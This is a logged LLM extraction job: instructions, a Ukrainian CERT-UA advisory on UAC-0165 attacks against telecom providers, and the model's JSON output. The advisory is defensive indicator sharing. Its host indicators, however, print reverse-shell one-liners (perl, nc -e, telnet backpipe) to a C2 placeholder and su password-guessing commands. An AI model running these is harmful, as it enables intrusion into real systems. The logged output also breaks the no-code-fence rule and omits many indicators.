@@ -1,0 +1,279 @@
+=== REQUEST (gemini gemini-3.7-flash) ===
+--- sampling ---
+{"temperature":0}
+--- instructions ---
+### ROLE ###
+You are a high-precision information extraction engine for cybersecurity incident reports (CERT-UA). You convert one report into a structured JSON object. You are NOT given a list of entity categories: describe each entity instead, and the categories will be discovered downstream from your descriptions.
+
+### WHAT TO EXTRACT ###
+1. `entities`: every concrete, named thing that matters in the incident: threat actors and groups, malware and tools, software products and versions, vendors, companies, government bodies, sectors, countries, domains, IP addresses, e-mail addresses, file names, vulnerabilities (CVE ids), persons, infrastructure, campaigns, techniques. Each entity is { "name", "kind", "gloss" }.
+   - `name`: the entity exactly as written in the text (original script and spelling; do not translate names). Use the most complete form that appears.
+   - `kind`: a generic type phrase in English, 1–4 lower-case words, saying what kind of thing this is (e.g. "hacking group", "malware family", "software product", "software vendor", "government body", "internet domain", "country", "vulnerability identifier", "security advisory"). Use the same phrase for entities of the same kind. This is your own wording; there is no fixed list.
+   - `gloss`: ONE sentence in English, at most 25 words, saying WHAT KIND OF THING the entity is, in a way that would hold outside this report. Examples: "A Russian state-sponsored hacking group also known as APT28." / "A backdoor malware family delivered through malicious Office documents." / "A Ukrainian central executive body responsible for communications and information protection." / "An internet domain used to host a phishing page." Do NOT restate what the entity did in this incident beyond what is needed to say what it is.
+2. `relations`: relationships STATED OR CLEARLY IMPLIED in the text between two extracted entities, as { "head", "type", "tail", "evidence" }.
+   - `head` / `tail` MUST exactly match `name` values from `entities`. Direction: head acts on tail.
+   - `type`: a short lower-case verb phrase with hyphens (e.g. `attacks`, `uses`, `delivers`, `targets-sector`, `exploits`, `hosts`, `attributed-to`, `affects`, `located-in`, `part-of`, `sends-email-to`).
+   - REUSE a type from the KNOWN RELATION TYPES below whenever it fits. Introduce a new type only when none fits; then also list it in `newRelationTypes` with a one-line definition.
+   - `evidence`: a short verbatim fragment of the text (at most 15 words) supporting the relation.
+   - Do NOT invent relations the text does not support. Few or no relations is a correct answer. Do NOT add a relation for every co-occurring pair.
+3. `newRelationTypes`: [{ "name", "definition" }] for relation types you introduced; an empty array is the normal case.
+
+### KNOWN RELATION TYPES ###
+- publishes: An organization or vendor officially releases or issues a security advisory, bulletin, or patch.
+- addresses-vulnerability-in: A security advisory or patch provides fixes for security vulnerabilities affecting a software product.
+- affects: A security vulnerability compromises or impacts a specific software product or component.
+- located-in: An organization, entity, or infrastructure is geographically or administratively based in a country or location.
+- part-of: An entity or component is a constituent sub-part of a larger system, suite, or organization.
+- hosts: An IP address, server, or domain hosts a specific file, malware payload, or service.
+- delivers: An exploit, campaign, or delivery mechanism drops or downloads a payload onto a target system.
+- exploits: A threat actor, malware, or campaign leverages a specific security vulnerability to compromise systems.
+- attacks: A threat actor compromises, targets, or executes unauthorized actions against a system, service, or organization.
+- communicates-with: A malware payload or host establishes network connections to an external IP address or server.
+- uses-malware: A threat actor utilizes or deploys a specific malware tool or family in their operations.
+
+### RULES ###
+- Do NOT extract "CERT-UA" itself (the reporting body), and do not extract generic technologies ("the internet", "computers", "e-mail") unless they name a specific system.
+- Deduplicate: one entry per distinct entity (the same thing written two ways is one entity; use the most complete form in `name`).
+- If a government body's name contains a country, also extract that country as its own entity.
+- Do not assign roles; `kind` and `gloss` together carry what the thing is.
+
+### FINAL OUTPUT FORMAT ###
+First think through the report in free form (who did what to whom, with which tools). Keep this BRIEF and do NOT use curly braces { } anywhere in it. Then output a single raw JSON object: { "entities": [...], "relations": [...], "newRelationTypes": [...] }. No markdown code fences, no commentary after the JSON. If nothing is found: { "entities": [], "relations": [], "newRelationTypes": [] }.
+
+Apply these instructions to the report in the user's next message.
+
+--- text ---
+<p><strong>Загальна інформація</strong></p><p>За даними публічних джерел за період з 11.05.2023 по 27.09.2023 організованою групою зловмисників, що відстежується за ідентифікатором UAC-0165, здійснено втручання в інформаційно-комунікаційні системи (ІКС) не менше ніж 11 провайдерів телекомунікацій України, що,&nbsp;серед іншого, призвело до перебоїв в наданні послуг споживачам.</p><p>Урядовою командою реагування на комп’ютерні надзвичайні події України CERT-UA у тісній взаємодії з фахівцями <strong>одного</strong> з провайдерів вжито заходів з дослідження інциденту, завдяки чому встановлено обставини кібератак, з'ясовано характерні тактики, техніки та процедури зловмисників, а також розкрито зловмисний задум щодо реалізації кіберзагроз на ряді аналогічних підприємств.</p><p>В умовах невпинної цифровізації значної кількості сфер сучасного життя, ураховуючи персистентну загрозу втрати зв'язку в результаті кінетичних атак на телекомунікації та об'єкти енергозабезпечення, стале функціонування операторів та провайдерів є суспільно важливою потребою.</p><p>З метою відбиття агресії в кіберпросторі, закликаємо українських провайдерів переглянути власні поверхні атак, врахувати викладені технічні деталі та, у разі виявлення (ознак) інцидентів інформаційної безпеки, невідкладно звертатися до CERT-UA з метою ініціювання заходів з реагування. </p><p>Слід враховувати, що інцидент, досліджений належним чином, підвищує вірогідність недопущення реалізації кіберзагроз на інших об'єктах нашої держави.</p><p>Зведена (не вичерпна) інформація щодо особливостей здійснення кібератак на українських провайдерів наведена нижче.</p><p><br></p><p><strong>Технічна інформація</strong></p><p>Як правило першим етапом кібератаки є розвідка, що починається з "грубого" сканування підмереж (автономної системи) провайдера за типовим набором мережевих портів із застосуванням, зокрема, masscan. Приклад застосованого конфігураційного файлу, а також скрипта для запуску masscan наведено на рис.1-2, відповідно.</p><p></p><p>Рис.1 Приклад конфігураційного файлу masscan</p><p><br></p><p></p><p>Рис.2 Приклад скрипта для запуску masscan з переліком типових мережевих портів (conf.txt)</p><p><br></p><p>У випадку ідентифікації інтерфейсів управління (наприклад, SSH, RDP), за умови не обмеження доступу до останніх, ініціюється підбір автентифікаційних даних. У разі виявлення ознак вразливостей здійснюється їхня експлуатація. Публічно доступні сервіси (вебдодатки), такі як білінг, особистий кабінет користувача, хостингові сервери (та вебсайти) тощо, аналізуються за допомогою спеціалізованих програм, в тому числі: <strong>ffuf, dirbuster, gowitness, nmap </strong>тощо.</p><p>Зауважимо (!), що активність по розвідці та експлуатації проводиться із заздалегідь скомпрометованих серверів, розміщених, зокрема, в українському сегменті мережі Інтернет. Для маршрутизації трафіку через такі вузли застосовуються проксі-сервери <strong>dante, socks5 </strong>та інші.</p><p>Детальний аналіз серверів, що використовуються як плацдарм для проведення кібератак, дозволив підтвердити факт їхньої завчасної компрометації. Крім того, встановлено додаткові ознаки такої компрометації.</p><p>1. Зазвичай, що також справедливо і для серверів хостингу, зловмисники встановлюють шкідливий PAM-модуль (відстежується як POEMGATE), що надає можливість автентифікуватися із статично визначеним паролем та зберігає введені під час автентифікації логіни та паролі у файл в XOR-кодованому вигляді (рис.3). Такі бекдори встановлюються заздалегідь та, з плином часу, надають змогу отримати актуальні автентифікаційні дані адміністраторів, які, в свою чергу, доволі часто використовуються для доступу до іншого серверного та мережевого обладнання.</p><p></p><p>Рис.3 Приклад декомпільованого програмного коду POEMGATE</p><p><br></p><p>2. З метою обходу налаштувань, пов'язаних з обмеженням можливості використання командної оболонки (shell), оригінальні файли "/bin/false", "/bin/nologin" замінюються на "bash".</p><p>3. Видалення ознак несанкціонованого доступу досягається, серед іншого, запуском утиліти WHITECAT.</p><p>4. Додатково на сервер може встановлюватися варіант програми POSEIDON ("/lib/x86_64-linux-gnu/libs.so"), функціонал якої містить повний спектр засобів віддаленого управління ЕОМ. При цьому, персистентність POSEIDON забезпечується шляхом підміни (модифікації) легітимного бінарного файлу "/usr/sbin/cron", в структуру якого додається програмний код, що створює потік з аргументом (start_routine) у вигляді функції "RunMain", яка імпортується з "libc.so" (рис.4):</p><p></p><p>Рис.4 Приклад коду модифікованого cron для виклику "RunMain" з метою запуску POSEIDON</p><p><br></p><p>У випадку надання провайдером послуг хостингу, після компрометації вебсайту на вебсервер може завантажуватися бекдор Weevely. Якщо сервер знаходиться в межах ІКС провайдера (та має "внутрішні" інтерфейси), він може бути використаний для розвитку атаки на інші елементи DMZ і/або локальної обчислювальної мережі.</p><p>Окрім спеціалізованих програм, персистентний несанкціонований доступ до інфраструктури провайдера реалізується за допомогою штатних облікових записів VPN (зазначеному сприяє відсутність багатофакторної автентифікації на основі одноразового коду з додатку). Очевидною ознакою компрометації VPN є підключення з IP-адрес мережі TOR та сервісів VPN, в тому числі тих, що "класифікуються" як українські.</p><p>Після проникнення до ІКС основні зусилля зосереджуються на ідентифікації так званих джамп-хостів та комп'ютерів системних адміністраторів. Якщо подальше горизонтальне переміщення унеможливлене списками контролю доступу мережевого обладнання, зловмисники можуть вносити зміни в їх налаштування.</p><p>Так як з часів "КіберБеркуту" майже кожен злам супроводжується публікацією "пруфів", частина часу присвячується ексфільтрації документів, креслень, схем, договорів. Принагідно, для підсилення "ефекту" та надання більшої публічності, зловмисники вдаються до викрадення паролів від офіційних облікових записів в Telegram, Facebook, а також токенів для розсилання SMS, тощо. Тому слід окремо звернути увагу на убезпечення таких "медійних" акаунтів шляхом налаштування багатофакторної автентифікації.</p><p>На заключному етапі кібератаки здійснюється виведення з ладу активного мережевого та серверного обладнання, а також систем зберігання даних. Зазначеному сприяє використання однакових паролів та не обмежений доступ до інтерфейсів управління цим обладнанням. Крім того, відсутність резервних копій актуальних конфігурацій негативно впливає на можливість оперативного відновлення працездатності. Приклад одного зі скриптів-деструкторів наведено на рис.5.</p><p></p><p>Рис.5 Приклад скрипта-деструктора</p><p><br></p><p>Як приклад, для порушення штатного режиму функціонування обладнання Mikrotik може застосовуватися відповідний функціонал скриптів та запланованих задач. Приклад одного зі скриптів наведено на рис.6.</p><p></p><p>Рис.6 Приклад скрипта та завдання для Mikrotik</p><p><br></p><p>Наполегливо рекомендуємо взяти до уваги інформацію, що викладена у статті "Як бути відповідальним та втримати кіберфронт" (<a href="https://cert.gov.ua/article/5436463" rel="noopener noreferrer" target="_blank">https://cert.gov.ua/article/5436463</a>).</p><p>Користуючись нагодою висловлюємо <strong>вдячність операторам і провайдерам телекомунікацій України</strong> за сприяння у боротьбі з кіберзагрозами та засвідчуємо готовність щодо залучення CERT-UA для дослідження кібератак, обміну інформацією, перевірки аномалій тощо.</p><p><br></p><p><strong>Індикатори кіберзагроз</strong></p><p><em>Файли</em>:</p><pre class="ql-syntax" spellcheck="false">2b88885fb57e28497522238bd8f8befc&nbsp; &nbsp; 8ddd681dd834ab66f6a1c00ba2830717bf845de5639708eb8e8ab795ffd1df5a&nbsp; &nbsp; ps (SOCKS5)
+5d9a661f35d4e136d389bea878c4252f&nbsp; &nbsp; eb01925836eed1dbd85a8ab9aa05c5c45dc051abaae9e67db3a53489d776b6c2&nbsp; &nbsp; pam_unix.so (POEMGATE)
+20a07ba71cab0f92c566b31e96fdf0e8&nbsp; &nbsp; 9060ca8e829fc136d1ecd95a5204abb48f3ce5b7339619c5668c7e176dcbb235&nbsp; &nbsp; pam_unix.so (POEMGATE)
+a74dbcae530f52f62cbdcef3dc18feee&nbsp;&nbsp;&nbsp;&nbsp;e9c5dc9cec95f31cea2eb88cc26a35d29c5f89f23bff6a7cfa1250dec6d5701a&nbsp;&nbsp;&nbsp;&nbsp;pam_unix.so&nbsp;(POEMGATE)
+45fad72d370ff88c5b349cb741cc26ce&nbsp; &nbsp; 8fb3ed6261a2358e0890bfd544e515af232f87d3aef947e09f640da7cc1b89d9&nbsp; &nbsp; wccrt (WHITECAT)
+59f2c3f6e4baf721c02a66179147241a&nbsp; &nbsp; 0e24a1268212a790bc3993750f194ac1e0996a6770b32b498341f06abac45d81&nbsp; &nbsp; libs.so (POSEIDON)
+75cde685cd3f00f354155e3c433698c7&nbsp; &nbsp; e4cff7071e184e3f1bfedfe30afa52ddd2cac1a00983508d142e51ecebfcba14&nbsp; &nbsp; .1
+61b70767326387f141a18e2fbb250a68&nbsp; &nbsp; b5ec1d43462a770d207eefb906516631e4d80eea55779509616b58b39a764455&nbsp; &nbsp; script.txt
+302f158ca6f6094e90bd43f7748dd65f&nbsp; &nbsp; 65c880f2a3833898c54d7f48ee0709a13887376b2ea5bc933b2e70f29614e728&nbsp; &nbsp; scan.sh
+</pre><p><em>Мережеві:</em></p><pre class="ql-syntax" spellcheck="false">eurotelle[.]com
+(IP-адреси, використані для SSH/VPN доступу)
+103[.]251.167.20
+103[.]251.167.21
+104[.]244.72.8
+107[.]189.30.69
+139[.]99.237.205
+146[.]59.233.33
+146[.]59.35.246
+156[.]146.63.139
+158[.]118.218.193
+162[.]247.73.192
+162[.]247.74.201
+162[.]247.74.206
+162[.]247.74.216
+162[.]247.74.27
+162[.]247.74.74
+167[.]86.94.107
+171[.]25.193.20
+171[.]25.193.235
+171[.]25.193.25
+171[.]25.193.77
+171[.]25.193.78
+179[.]43.159.195
+179[.]43.159.198
+182[.]118.218.193
+185[.]100.86.121
+185[.]100.87.41
+185[.]129.61.129
+185[.]129.61.7
+185[.]129.62.62
+185[.]130.47.58
+185[.]14.28.207
+185[.]165.169.239
+185[.]220.101.152
+185[.]220.102.240
+185[.]220.102.241
+185[.]220.102.242
+185[.]220.102.247
+185[.]220.102.251
+185[.]220.102.252
+185[.]220.102.253
+185[.]220.102.254
+185[.]220.102.8
+185[.]220.103.8
+185[.]233.100.23
+185[.]235.146.29
+185[.]241.208.206
+185[.]241.208.232
+185[.]246.188.60
+185[.]246.188.67
+185[.]246.188.74
+185[.]254.75.55
+185[.]34.33.2
+185[.]56.83.83
+185[.]67.82.114
+192[.]42.116.13
+192[.]42.116.16
+192[.]42.116.18
+192[.]42.116.23
+192[.]42.116.25
+193[.]218.118.158
+193[.]218.118.182
+195[.]69.202.145
+203[.]28.246.189
+204[.]28.48.77
+204[.]8.156.142
+217[.]12.208.73
+23[.]129.64.133
+2[.]56.164.52
+2[.]58.56.101
+45[.]139.122.241
+45[.]141.215.111
+45[.]154.98.225
+46[.]182.21.248
+51[.]89.153.112
+5[.]181.80.132
+5[.]252.118.19
+5[.]255.99.205
+5[.]45.73.243
+62[.]102.148.68
+62[.]182.84.146
+77[.]48.28.204
+77[.]48.28.236
+79[.]137.194.146
+80[.]67.167.81
+82[.]221.128.191
+84[.]239.46.144
+89[.]147.111.106
+89[.]248.165.181
+91[.]208.75.153
+91[.]208.75.3
+91[.]224.92.110
+94[.]102.51.15
+95[.]214.234.139
+95[.]214.55.43
+</pre><p><em>Хостові:</em></p><pre class="ql-syntax" spellcheck="false">/lib/libc.so.7
+/lib/x86_64-linux-gnu/libs.so
+/lib/x86_64-linux-gnu/security/pam_unix.so
+/tmp/.1
+/usr/sbin/wccrt
+/usr/sbin/wcc
+/var/lib/vim‍/ps
+/var/lib/vim‍/vfth/scan.sh
+expect -c 'spawn su -c "whoami" "%user%"; expect -re "assword"; send "%password%"; expect eof;' 2&gt;&amp;1
+perl -e 'use Socket;$i="%C2IP%";$p=3333;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};' 2&gt;&amp;1
+python -c 'import pexpect as p,sys;c=p.spawn("su %user% -c whoami");c.expect(".*assword:");c.sendline("r3b3iFv4r3b3iFv4");i=c.expect([p.EOF,p.TIMEOUT]);sys.stdout.write(c.before[3:] if i!=p.TIMEOUT else "")' 2&gt;&amp;1
+sleep 1; nc -e /bin/sh %C2IP% 3333 2&gt;&amp;1
+sleep 1;rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet %C2IP% 3333 0&lt;/tmp/backpipe | /bin/sh 1&gt;/tmp/backpipe 2&gt;&amp;1
+/bin/false (порушення цілісності/підміна)
+/bin/nologin (порушення цілісності/підміна)
+/usr/sbin/cron (порушення цілісності/підміна)
+</pre>
+
+=== RESPONSE (5.3s, in 6542 / out 1085 tok, STOP) ===
+The report details cyberattacks conducted between May and September 2023 by threat group UAC-0165 targeting at least 11 Ukrainian telecommunications providers. The threat actors conducted scanning and reconnaissance using tools like masscan, ffuf, dirbuster, gowitness, and nmap, deployed proxy software (dante, socks5), and used backdoors and malicious tools including POEMGATE, WHITECAT, POSEIDON, and Weevely. They targeted network equipment such as Mikrotik devices to disrupt operations.
+
+```json
+{
+  "entities": [
+    {
+      "name": "UAC-0165",
+      "kind": "threat actor",
+      "gloss": "A threat actor tracked by CERT-UA responsible for attacks against Ukrainian critical infrastructure and telecommunications."
+    },
+    {
+      "name": "Україна",
+      "kind": "country",
+      "gloss": "A country located in Eastern Europe."
+    },
+    {
+      "name": "masscan",
+      "kind": "software tool",
+      "gloss": "An open-source Internet-scale network port scanner."
+    },
+    {
+      "name": "ffuf",
+      "kind": "software tool",
+      "gloss": "A fast web fuzzer written in Go used for discovering web resources."
+    },
+    {
+      "name": "dirbuster",
+      "kind": "software tool",
+      "gloss": "A multi-threaded Java application designed to brute-force directories and files on web servers."
+    },
+    {
+      "name": "gowitness",
+      "kind": "software tool",
+      "gloss": "A web screenshot utility using Chrome Headless to generate screenshots of web services."
+    },
+    {
+      "name": "nmap",
+      "kind": "software tool",
+      "gloss": "A network exploration tool and security scanner."
+    },
+    {
+      "name": "dante",
+      "kind": "software product",
+      "gloss": "A circuit-level SOCKS server and client implementation."
+    },
+    {
+      "name": "POEMGATE",
+      "kind": "malware family",
+      "gloss": "A malicious PAM module backdoor that captures credentials and allows unauthorized authentication."
+    },
+    {
+      "name": "WHITECAT",
+      "kind": "software tool",
+      "gloss": "A utility used to delete logs and erase evidence of unauthorized access on Unix-like systems."
+    },
+    {
+      "name": "POSEIDON",
+      "kind": "malware family",
+      "gloss": "A Linux remote access tool providing full remote system control capabilities."
+    },
+    {
+      "name": "Weevely",
+      "kind": "malware family",
+      "gloss": "A stealth PHP web shell designed for post-exploitation access and administration."
+    },
+    {
+      "name": "КіберБеркут",
+      "kind": "threat actor",
+      "gloss": "A pro-Russian hacktivist group known for conducting cyber operations against Ukrainian targets."
+    },
+    {
+      "name": "Mikrotik",
+      "kind": "hardware vendor",
+      "gloss": "A Latvian network equipment manufacturer producing routers and wireless ISP systems."
+    },
+    {
+      "name": "eurotelle[.]com",
+      "kind": "internet domain",
+      "gloss": "A network domain identified as part of the threat actor's infrastructure."
+    }
+  ],
+  "relations": [
+    {
+      "head": "UAC-0165",
+      "type": "uses-malware",
+      "tail": "POEMGATE",
+      "evidence": "зловмисники встановлюють шкідливий PAM-модуль (відстежується як POEMGATE)"
+    },
+    {
+      "head": "UAC-0165",
+      "type": "uses-malware",
+      "tail": "WHITECAT",
+      "evidence": "досягається, серед іншого, запуском утиліти WHITECAT."
+    },
+    {
+      "head": "UAC-0165",
+      "type": "uses-malware",
+      "tail": "POSEIDON",
+      "evidence": "на сервер може встановлюватися варіант програми POSEIDON"
+    },
+    {
+      "head": "UAC-0165",
+      "type": "uses-malware",
+      "tail": "Weevely",
+      "evidence": "на вебсервер може завантажуватися бекдор Weevely"
+    }
+  ],
+  "newRelationTypes": []
+}
+```
